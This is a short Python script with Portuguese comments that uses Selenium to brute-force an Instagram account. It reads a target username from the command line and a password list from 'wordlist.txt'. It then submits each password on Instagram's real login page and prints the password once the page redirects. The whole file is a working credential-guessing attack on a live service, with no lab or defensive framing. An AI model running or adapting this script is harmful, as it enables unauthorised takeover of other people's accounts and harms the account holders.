from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import sys
import time

# Lendo o nome de usuário da linha de comando
username = sys.argv[1]

# Abrindo o arquivo de wordlist
with open('wordlist.txt') as f:
    passwords = f.readlines()

# Abrindo o navegador
driver = webdriver.Firefox(executable_path='/home/kali/Downloads/geckodriver')

# Navegando para a página de login
driver.get("https://www.instagram.com/accounts/login/")

# Aguardando 2 segundos para página carregar completamente
time.sleep(2)

# Selecionando o campo de usuário e digitando o nome de usuário

# Tentando fazer login com cada senha da lista
for password in passwords:
    user_field = driver.find_element("name", "username")
    user_field.send_keys(username)
    # Selecionando o campo de senha e digitando a senha
    password_field = driver.find_element("name", "password")
    password_field.send_keys(password.strip())

    # Enviando o formulário de login pressionando Enter
    password_field.send_keys(Keys.ENTER)

    # Aguardando 10 segundos para verificar se o login foi bem sucedido ou se ocorreu um erro
    time.sleep(5)

    # Verificando se o login foi bem sucedido ou se ocorreu um erro, se o url da pagina mudou para https://www.instagram.com/accounts/onetap/?next=%2F então o login foi bem sucedido, se nao, tente outra senha
    if driver.current_url == "https://www.instagram.com/accounts/onetap/?next=%2F":
        print("Login com sucesso!")
        print("Senha: " + password)
        break
    else:
        print("Falhou: " + password)
        # Se o login falhou, recarregue a página e tente novamente com a próxima senha
        driver.get("https://www.instagram.com/accounts/login/")
        time.sleep(2)

    
